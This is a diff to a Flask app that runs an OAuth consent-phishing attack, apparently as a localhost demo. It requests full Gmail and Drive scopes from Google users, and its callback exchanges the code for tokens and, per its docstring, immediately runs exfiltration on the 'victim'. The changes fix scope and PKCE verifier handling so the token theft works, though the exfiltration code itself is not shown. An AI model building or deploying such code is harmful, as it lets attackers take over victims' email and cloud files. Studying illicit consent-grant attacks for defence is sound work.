@@ -31,6 +31,10 @@ load_dotenv()
 
 # Allow HTTP for localhost demo
 os.environ["OAUTHLIB_INSECURE_TRANSPORT"] = "1"
+# Google returns canonical scope URLs which differ from shorthand aliases
+# (e.g. "email" -> "https://www.googleapis.com/auth/userinfo.email").
+# This tells requests-oauthlib to accept scope changes instead of raising.
+os.environ["OAUTHLIB_RELAX_TOKEN_SCOPE"] = "1"
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -44,12 +48,16 @@ CLIENT_SEC  = os.path.join(BASE_DIR, "client_secret.json")
 
 # ── Dangerous scopes — this is the "weaponized" consent request ───────────────
 
+# Use canonical scope URLs that Google actually returns in the token response.
+# Shorthand aliases like "email" and "profile" get expanded by Google, which
+# causes requests-oauthlib to flag a scope mismatch. Using the full URLs avoids
+# that warning even with OAUTHLIB_RELAX_TOKEN_SCOPE as a belt-and-suspenders fix.
 SCOPES = [
     "openid",
-    "email",
-    "profile",
-    "https://mail.google.com",                        # Full Gmail read/write/delete
-    "https://www.googleapis.com/auth/drive",           # Full Drive access
+    "https://www.googleapis.com/auth/userinfo.email",    # canonical "email"
+    "https://www.googleapis.com/auth/userinfo.profile",  # canonical "profile"
+    "https://mail.google.com/",                          # Full Gmail (trailing slash matches Google's response)
+    "https://www.googleapis.com/auth/drive",             # Full Drive access
 ]
 
 # ── Helpers ──────────────────────────────────────────────────────────────────
@@ -76,6 +84,10 @@ def append_event(record: dict):
             json.dump(events, f, indent=2)
 
 
+# In-memory PKCE code verifier store to bypass browser session/cookie drop issues on localhost
+pkce_verifier_store = {}
+
+
 # ── Routes ────────────────────────────────────────────────────────────────────
 
 @app.route("/")
@@ -97,6 +109,11 @@ def authorize():
         include_granted_scopes="true"
     )
     session["oauth_state"] = state
+    session["code_verifier"] = flow.code_verifier
+    
+    # Store in memory using state as key to avoid cookie domain mismatch issues
+    pkce_verifier_store[state] = flow.code_verifier
+    
     # Log the attempt
     append_event({
         "type": "auth_attempt",
@@ -115,8 +132,24 @@ def callback():
     We swap the code for tokens and immediately run exfiltration.
     """
     # 1. Exchange authorization code for tokens
-    flow = make_flow()
-    flow.fetch_token(authorization_response=request.url)
+    state = request.args.get("state")
+    flow = Flow.from_client_secrets_file(
+        CLIENT_SEC,
+        scopes=SCOPES,
+        state=state,
+        redirect_uri="http://localhost:5001/callback"
+    )
+    
+    # Restore code verifier from in-memory store or session
+    code_verifier = pkce_verifier_store.get(state) or session.get("code_verifier")
+
+    # Pass code_verifier directly to fetch_token — this is the correct API.
+    # Setting flow.code_verifier as an attribute does NOT work; the verifier
+    # must be forwarded as a kwarg so it ends up in the token POST body.
+    flow.fetch_token(
+        authorization_response=request.url,
+        code_verifier=code_verifier   # <-- fix: replaces broken attribute assignments
+    )
     creds = flow.credentials
 
     # 2. Decode ID token to get victim identity
